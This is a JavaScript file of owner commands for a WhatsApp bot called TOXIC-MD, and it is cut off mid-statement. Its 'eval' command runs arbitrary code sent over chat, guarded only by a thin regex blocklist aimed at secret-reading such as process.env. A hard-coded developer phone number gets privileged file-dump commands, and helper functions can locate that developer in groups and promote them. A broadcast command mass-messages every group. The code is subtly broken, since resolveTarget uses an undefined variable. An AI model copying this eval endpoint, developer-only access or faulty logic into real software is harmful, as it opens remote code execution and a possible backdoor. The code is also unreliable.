// Cmds/Owner.js — 23 commands
  'use strict';

  const { getSettings } = require("../Database/config");
const { getFakeQuoted } = require('../lib/fakeQuoted');
const ownerMiddleware = require('../lib/Ownermiddleware');

const getMentionedJid = (m) => {
    if (m.msg?.contextInfo?.mentionedJid?.length > 0) return m.msg.contextInfo.mentionedJid[0];
    if (m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) return m.message.extendedTextMessage.contextInfo.mentionedJid[0];
    return null;
};

const resolveTarget = (jid, participants) => {
    if (!jid) return null;
    const server = (jid.split('@')[1] || '').toLowerCase();
    const user = jid.split('@')[0].split(':')[0].replace(/\D/g, '');
    if (!user) return null;
    if (server === 'lid') {
        const match = participants.find(p => {
            const lid = (p.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
            return lid === user;
        });
        if (match) return (match.jid || match.id).split(':')[0].split('@')[0].replace(/\D/g, '') + '@s.whatsapp.net';
        return user + '@s.whatsapp.net';
    }
    if (match) return (match.jid || match.id).split(':')[0].split('@')[0].replace(/\D/g, '') + '@s.whatsapp.net';
    return user + '@s.whatsapp.net';
};
const { readdirSync, statSync, unlinkSync, existsSync } = require('fs');
const { join } = require('path');

const BLOCKED_PATTERNS = [
    /process\.env/,
    /config\/settings/,
    /require\s*\(\s*['"].*settings['"]/
];
const { S_WHATSAPP_NET } = require('@whiskeysockets/baileys');
const fs = require('fs').promises;
  const path = require('path');

  const normalizeNumber = (jid) => {
      if (!jid) return '';
      return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const DEVELOPER = normalizeNumber('254114885159');
  const MAX_TEXT_SIZE = 3000;
  const CATEGORIES = ['+18', 'Ai-Tools', 'Coding', 'Downloads', 'Editing', 'General', 'Groups', 'Heroku', 'Logo', 'Owner', 'Privacy', 'Search', 'Settings', 'Utils'];
  const PLUGINS_DIR = path.join(__dirname, '..', '..', 'plugins');

  function resolveAlias(input) {
      try {
          const { aliases } = require('../Handler/commandHandler');
          if (aliases && aliases[input.toLowerCase()]) return aliases[input.toLowerCase()];
      } catch {}
      return input;
  }


const FEATURES_DIR = path.join(__dirname, '..', '..', 'features');
const middleware = require('../lib/middleware');
const DEVELOPER_NUMBER = "254114885159";


const findDevInGroup = (participants) => {
    return participants.find(p => {
        const idNum = normalizeNumber(p.id || '');
        const jidNum = normalizeNumber(p.jid || '');
        const devNum = normalizeNumber(DEVELOPER_NUMBER);
        return idNum === devNum || jidNum === devNum;
    });
};

const getActualJid = (member) => {
    const raw = member.jid || member.id || '';
    return raw.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
};

const retryPromote = async (client, groupId, participant, maxRetries = 5, baseDelay = 1500) => {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            await client.groupParticipantsUpdate(groupId, [participant], "promote");
            return true;
        } catch (e) {
            if (attempt === maxRetries) throw e;
            await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1)));
        }
    }
};
dreaded({
  pattern: "addbutton",
  alias: ["addbtn"],
  desc: "Adds a custom button to the menu",
  category: "Owner",
  filename: __filename
}, async (context) => {
    const { client, m, args } = context;
    const fq = getFakeQuoted(m);
    try {
      if (args.length < 2) {
        await client.sendMessage(m.chat, { text: `╭───(    TOXIC-MD    )───\n├───≫ USAGE ≪───\n├ \n├ .addbutton <button_name> <command>\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧` }, { quoted: fq });
        return;
      }
      const buttonName = args[0];
      const command = args[1];
      await client.sendMessage(m.chat, { text: `╭───(    TOXIC-MD    )───\n├───≫ BUTTON ADDED ≪───\n├ \n├ Added button "${buttonName}"\n├ for command "${command}"\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧` }, { quoted: fq });
    } catch (error) {
      console.error(`AddButton error: ${error.stack}`);
      await client.sendMessage(m.chat, { text: `╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Error adding custom button.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧` }, { quoted: fq });
    }
  });

// ── archive
dreaded({
  pattern: "archive",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, store } = context;
        const fq = getFakeQuoted(m);

        if (!m?.chat) return;

        if (m.chat.endsWith('@broadcast') || m.chat.endsWith('@newsletter')) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Cannot archive this type of chat.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        let lastMessages;
        if (store?.chats?.[m.chat] && Array.isArray(store.chats[m.chat]) && store.chats[m.chat].length) {
            lastMessages = store.chats[m.chat].slice(-1);
        }

        try {
            await client.chatModify(
                {
                    archive: true,
                    lastMessages
                },
                m.chat
            );

            await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ ARCHIVED ≪───\n├ \n├ Chat archived.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        } catch (err) {
            console.error('Archive chat failed:', err);
            await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Failed to archive chat.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }
    });
});

// ── block
dreaded({
  pattern: "block",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, text } = context;
        const fq = getFakeQuoted(m);

        let rawJid = null;

        if (m.quoted?.sender) {
            rawJid = m.quoted.sender;
        } else {
            const mentioned = getMentionedJid(m);
            if (mentioned) rawJid = mentioned;
        }

        if (!rawJid && text && text.replace(/[^0-9]/g, '')) {
            rawJid = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        }

        if (!rawJid) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Tag or reply to a user to block.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        let blockJid = rawJid;

        if (rawJid.endsWith('@lid') || rawJid.includes(':')) {
            try {
                const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat) : { participants: [] };
                blockJid = resolveTarget(rawJid, groupMetadata.participants);
            } catch {
                blockJid = rawJid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
            }
        }

        if (!blockJid) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Couldn't resolve that user.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        try {
            await client.updateBlockStatus(blockJid, 'block');
            const parts = blockJid.split('@')[0];
            return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ BLOCKED ≪───\n├ \n├ ${parts} is blocked. Good riddance.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        } catch (e) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Failed to block that user.\n├ ${e?.message || 'Unknown error'}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }
    });
});

// ── botgc
dreaded({
  pattern: "botgc",
  category: "Owner",
  filename: __filename
}, async (context) => {
  await ownerMiddleware(context, async () => {
    const { client, m, text, Owner } = context;
    const fq = getFakeQuoted(m);

  try {

      let getGroupzs = await client.groupFetchAllParticipating();
      let groupzs = Object.entries(getGroupzs)
          .slice(0)
          .map((entry) => entry[1]);
      let anaa = groupzs.map((v) => v.id);
      let jackhuh = `╭───(    TOXIC-MD    )───\n├───≫ BOT GROUPS ≪───\n├ \n`
      await client.sendMessage(m.chat, { react: { text: '⌛', key: m.key } });
      const promises = anaa.map((i) => {
        return new Promise((resolve) => {
          client.groupMetadata(i).then((metadat) => {
            setTimeout(() => {
              jackhuh += `├ Subject: ${metadat.subject}\n`
              jackhuh += `├ Members: ${metadat.participants.length}\n`
              jackhuh += `├ Jid: ${i}\n├ \n`
              resolve()
            }, 500);
          })
        })
      })
      await Promise.all(promises)
      jackhuh += `╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
      await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
      m.reply(jackhuh);

  } catch (e) {
    await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    m.reply(`╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Error occured while accessing\n├ bot groups.\n├ ${e}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`)
  }

  });
});

// ── broadcast
dreaded({
  pattern: "broadcast",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, text, participants, pushname } = context;
        const fq = getFakeQuoted(m);

if (!text) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Provide a broadcast message!\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
if (!m.isGroup) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ This command is meant for groups.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

let getGroups = await client.groupFetchAllParticipating() 
         let groups = Object.entries(getGroups) 
             .slice(0) 
             .map(entry => entry[1]) 
         let res = groups.map(v => v.id) 

await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ BROADCAST ≪───\n├ \n├ Sending broadcast message...\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`)

for (let i of res) { 


let txt = `╭───(    TOXIC-MD    )───\n├───≫ BROADCAST ≪───\n├ \n├ Message: ${text}\n├ \n├ Written by: ${pushname}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧` 

await client.sendMessage(i, { 
                 image: { 
                     url: "https://qu.ax/XxQwp.jpg" 
                 }, mentions: participants.map(a => a.id),
                 caption: `${txt}` 
             }) 
         } 
await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ DONE ≪───\n├ \n├ Message sent across all groups.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
})

});

// ── clear
dreaded({
  pattern: "clear",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, store } = context;
        const fq = getFakeQuoted(m);

        if (!m?.chat) return;

        if (m.chat.endsWith('@broadcast') || m.chat.endsWith('@newsletter')) {
            return m.reply('╭───(    TOXIC-MD    )───\n├ \n├ Cannot clear this type of chat.\n╰──────────────────☉\n> ©𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧');
        }

        try {
            let lastMessages;
            if (store?.chats?.[m.chat] && Array.isArray(store.chats[m.chat]) && store.chats[m.chat].length) {
                lastMessages = store.chats[m.chat].slice(-1);
            }

            await client.chatModify({ delete: true, lastMessages }, m.chat);
            await m.reply('╭───(    TOXIC-MD    )───\n├───≥ CLEARED ≤───\n├ \n├ Chat cleared.\n╰──────────────────☉\n> ©𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧');
        } catch (err) {
            if (err?.message?.includes('myAppStateKey') || err?.output?.statusCode === 404) {
                return m.reply('╭───(    TOXIC-MD    )───\n├───≥ NOT READY ≤───\n├ \n├ App state not fully synced yet.\n├ Wait a minute then try again.\n╰──────────────────☉\n> ©𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧');
            }
            await m.reply('╭───(    TOXIC-MD    )───\n├───≥ ERROR ≤───\n├ \n├ Failed to clear chat.\n╰──────────────────☉\n> ©𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧');
        }
    });
});

// ── cleartmp
dreaded({
  pattern: "cleartmp",
  desc: "Delete all temporary files (Owner only)",
  category: "Owner",
  filename: __filename
}, async (context) => {
        const { client, m, isOwner } = context;
        const fq = getFakeQuoted(m);
        if (!isOwner) return m.reply('Owner only command.');
        const tmpDirs = ['./tmp', './temp'].filter(d => existsSync(d));
        if (!tmpDirs.length) return m.reply('No tmp directories found.');
        let deleted = 0;
        let skipped = 0;
        for (const dir of tmpDirs) {
            for (const file of readdirSync(dir)) {
                const fp = join(dir, file);
                try {
                    if (statSync(fp).isFile()) {
                        unlinkSync(fp);
                        deleted++;
                    } else {
                        skipped++;
                    }
                } catch {
                    skipped++;
                }
            }
        }
        await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ TMP CLEANED ≪───\n├ \n├ ✅ Deleted: ${deleted} file(s)\n├ ⏩ Skipped: ${skipped} item(s)\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
    });

// ── eval
dreaded({
  pattern: "eval",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, text } = context;
        const fq = getFakeQuoted(m);
        try {
            const trimmedText = text.trim();
            if (!trimmedText) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ No command provided for eval!\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
            for (const pattern of BLOCKED_PATTERNS) {
                if (pattern.test(trimmedText)) return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ BLOCKED ≪───\n├ \n├ That eval is blocked for security.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
            }
            let evaled = await eval(trimmedText);
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
            if (evaled && evaled !== 'undefined' && evaled !== 'null') await m.reply(evaled);
        } catch (err) {
            await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ EVAL ERROR ≪───\n├ \n├ ${String(err)}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }
    });
});

// ── fullpp
dreaded({
  pattern: "fullpp",
  alias: ["setpp","setprofile"],
  category: "Owner",
  filename: __filename
}, async (context) => {
        await ownerMiddleware(context, async () => {
            const { client, m, msgToxic, generateProfilePicture } = context;
            const fq = getFakeQuoted(m);

            try {
                const fs = require('fs');

                if (!msgToxic) {
                    return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ REPLY TO AN IMAGE!\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
                }

                if (!msgToxic.imageMessage) {
                    return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ THAT IS NOT AN IMAGE!\n├ REPLY TO AN IMAGE!\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
                }

                const medis = await client.downloadAndSaveMediaMessage(msgToxic.imageMessage);
                const { img } = await generateProfilePicture(medis);

                client.query({
                    tag: 'iq',
                    attrs: { target: undefined, to: S_WHATSAPP_NET, type: 'set', xmlns: 'w:profile:picture' },
                    content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]
                });

                fs.unlinkSync(medis);
                m.reply(`╭───(    TOXIC-MD    )───\n├───≫ UPDATED ≪───\n├ \n├ Bot Profile Picture Updated.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

            } catch (error) {
                m.reply(`╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Failed to update profile photo.\n├ ${error}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
            }
        });
    });

// ── getcmd
dreaded({
  pattern: "getcmd",
  category: "Owner",
  filename: __filename
}, async (context) => {
      const { client, m, text, prefix } = context;
      const fq = getFakeQuoted(m);

      if (normalizeNumber(m.sender) !== DEVELOPER) {
          return await client.sendMessage(m.chat, {
              text: `╭───(    TOXIC-MD    )───\n├───≫ ACCESS DENIED ≪───\n├ \n├ This command is restricted to the bot owner.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
          }, { quoted: fq });
      }

      if (!text) {
          const categoryList = CATEGORIES.map(c => `├ • ${c}`).join('\n');
          return await client.sendMessage(m.chat, {
              text: `╭───(    TOXIC-MD    )───\n├───≫ GETCMD ≪───\n├ \n├ Usage: ${prefix}getcmd <name>\n├ \n├ Categories:\n${categoryList}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
          }, { quoted: fq });
      }

      const rawInput = text.trim().endsWith('.js') ? text.trim().slice(0, -3) : text.trim();
      const commandName = resolveAlias(rawInput);
      let fileFound = false;

      for (const category of CATEGORIES) {
          const filePath = path.join(PLUGINS_DIR, category, `${commandName}.js`);
          try {
              const data = await fs.readFile(filePath, 'utf8');
              const fileBuffer = Buffer.from(data, 'utf8');
              const aliasNote = commandName !== rawInput ? `├ Alias: ${rawInput} → ${commandName}\n` : '';

              if (data.length <= MAX_TEXT_SIZE) {
                  await client.sendMessage(m.chat, {
                      text: `╭───(    TOXIC-MD    )───\n├───≫ COMMAND FILE ≪───\n├ \n├ File: ${commandName}.js\n├ Category: ${category}\n├ Size: ${data.length} chars\n${aliasNote}├ \n\`\`\`javascript\n${data}\n\`\`\`\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
                  }, { quoted: fq });
              }

              await client.sendMessage(m.chat, {
                  document: fileBuffer,
                  fileName: `${commandName}.js`,
                  mimetype: 'application/javascript',
                  caption: `╭───(    TOXIC-MD    )───\n├ 📄 ${commandName}.js\n├ Category: ${category}\n├ Size: ${data.length} chars\n${aliasNote}╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
              }, { quoted: fq });

              fileFound = true;
              break;
          } catch (err) {
              if (err.code !== 'ENOENT') {
                  return await client.sendMessage(m.chat, {
                      text: `╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Error reading file: ${err.message}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
                  }, { quoted: fq });
              }
          }
      }

      if (!fileFound) {
          await client.sendMessage(m.chat, {
              text: `╭───(    TOXIC-MD    )───\n├───≫ NOT FOUND ≪───\n├ \n├ "${rawInput}" not found in any category.\n├ \n├ Tip: use ${prefix}getcmd with no args\n├ to see all categories.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
          }, { quoted: fq });
      }
  });

// ── getfunc
dreaded({
  pattern: "getfunc",
  category: "Owner",
  filename: __filename
}, async (context) => {
    const { client, m, text, prefix } = context;
    const fq = getFakeQuoted(m);

    if (normalizeNumber(m.sender) !== DEVELOPER) {
        return await client.sendMessage(m.chat, {
            text: `╭───(    TOXIC-MD    )───\n├───≫ ACCESS DENIED ≪───\n├ \n├ This command is restricted to the bot owner.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
        }, { quoted: fq });
    }

    if (!text) {
        let files = [];
        try { const entries = await fs.readdir(FEATURES_DIR); files = entries.filter(f => f.endsWith('.js')); } catch {}
        const fileList = files.map(f => `├ • ${f.replace('.js', '')}`).join('\n');
        return await client.sendMessage(m.chat, {
            text: `╭───(    TOXIC-MD    )───\n├───≫ GETFUNC ≪───\n├ \n├ Usage: ${prefix}getfunc <name>\n├ \n├ Available features:\n${fileList || '├ (none found)'}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
        }, { quoted: fq });
    }

    const funcName = text.trim().endsWith('.js') ? text.trim().slice(0, -3) : text.trim();
    const filePath = path.join(FEATURES_DIR, `${funcName}.js`);

    try {
        const data = await fs.readFile(filePath, 'utf8');
        const fileBuffer = Buffer.from(data, 'utf8');

        if (data.length <= MAX_TEXT_SIZE) {
            await client.sendMessage(m.chat, {
                text: `╭───(    TOXIC-MD    )───\n├───≫ FEATURE FILE ≪───\n├ \n├ File: ${funcName}.js\n├ Size: ${data.length} chars\n├ \n\`\`\`javascript\n${data}\n\`\`\`\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            }, { quoted: fq });
        }

        await client.sendMessage(m.chat, {
            document: fileBuffer,
            fileName: `${funcName}.js`,
            mimetype: 'application/javascript',
            caption: `╭───(    TOXIC-MD    )───\n├ 📄 ${funcName}.js\n├ Folder: features/\n├ Size: ${data.length} chars\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
        }, { quoted: fq });

    } catch (err) {
        if (err.code === 'ENOENT') {
            let files = [];
            try { const entries = await fs.readdir(FEATURES_DIR); files = entries.filter(f => f.endsWith('.js')); } catch {}
            const fileList = files.map(f => `├ • ${f.replace('.js', '')}`).join('\n');
            return await client.sendMessage(m.chat, {
                text: `╭───(    TOXIC-MD    )───\n├───≫ NOT FOUND ≪───\n├ \n├ "${funcName}" not found in features/.\n├ \n├ Available:\n${fileList || '├ (none found)'}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            }, { quoted: fq });
        }
        return await client.sendMessage(m.chat, {
            text: `╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Error reading file: ${err.message}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
        }, { quoted: fq });
    }
});

// ── joingc
dreaded({
  pattern: "joingc",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, text, args, Owner, botname } = context;
        const fq = getFakeQuoted(m);

        if (!botname) {
            console.error(`Join-Error: botname missing in context.`);
            return m.reply(
                `╭───(    TOXIC-MD    )───\n├ \n├ Bot's fucked. No botname in context.\n├ Yell at your dev, dumbass.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            );
        }

        if (!Owner) {
            console.error(`Join-Error: Owner missing in context.`);
            return m.reply(
                `╭───(    TOXIC-MD    )───\n├ \n├ Bot's broken. No owner in context.\n├ Go cry to the dev.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            );
        }

        let raw = (text && text.trim()) || (m.quoted && ((m.quoted.text) || (m.quoted && m.quoted.caption))) || "";
        raw = String(raw || "").trim();

        if (!raw) {
            return m.reply(
                `╭───(    TOXIC-MD    )───\n├───≫ USAGE ≪───\n├ \n├ Provide a real group invite link\n├ or reply to one.\n├ Example: *${args && args[0] ? args[0] : '.join https://chat.whatsapp.com/abcdef...'}*\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            );
        }

        const urlRegex = /(?:https?:\/\/)?chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i;
        const match = raw.match(urlRegex);
        let inviteCode = match ? match[1] : null;

        if (!inviteCode) {
            const token = raw.split(/\s+/)[0];
            if (/^[A-Za-z0-9_-]{8,}$/.test(token)) {
                inviteCode = token;
            }
        }

        if (!inviteCode) {
            return m.reply(
                `╭───(    TOXIC-MD    )───\n├ \n├ That ain't a valid link or invite\n├ code. Don't waste my time.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            );
        }

        inviteCode = inviteCode.replace(/\?.*$/, '').trim();

        try {
            const info = await client.groupGetInviteInfo(inviteCode);
            const subject = info?.subject || info?.groupMetadata?.subject || "Unknown Group";

            await client.groupAcceptInvite(inviteCode);

            return m.reply(
                `╭───(    TOXIC-MD    )───\n├───≫ JOINED ≪───\n├ \n├ Joined: *${subject}*\n├ Don't spam, or I'll ghost you.\n├ — ${botname}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            );
        } catch (error) {
            console.error(`[JOIN-ERROR] invite=${inviteCode}`, error && (error.stack || error));

            const status =
                (error && error.output && error.output.statusCode) ||
                error?.statusCode ||
                error?.status ||
                (error?.data && (error.data.status || error.data)) ||
                (error?.response && error.response.status) ||
                null;

            if (status === 400 || status === 404) {
                return m.reply(
                    `╭───(    TOXIC-MD    )───\n├ \n├ Group does not exist or the link\n├ is invalid. Stop sending trash links.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
                );
            }
            if (status === 401) {
                return m.reply(
                    `╭───(    TOXIC-MD    )───\n├ \n├ I was previously removed from that\n├ group. I can't rejoin using this link.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
                );
            }
            if (status === 409) {
                return m.reply(
                    `╭───(    TOXIC-MD    )───\n├ \n├ I'm already in that group, genius.\n├ You trying to confuse me?\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
                );
            }
            if (status === 410) {
                return m.reply(
                    `╭───(    TOXIC-MD    )───\n├ \n├ That invite link was reset. Get a\n├ fresh one and try again.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
                );
            }
            if (status === 403) {
                return m.reply(
                    `╭───(    TOXIC-MD    )───\n├ \n├ I don't have permission to join\n├ that group. Maybe it's private.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
                );
            }
            if (status === 500) {
                return m.reply(
                    `╭───(    TOXIC-MD    )───\n├ \n├ That group is full or server error.\n├ Try later or check the link.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
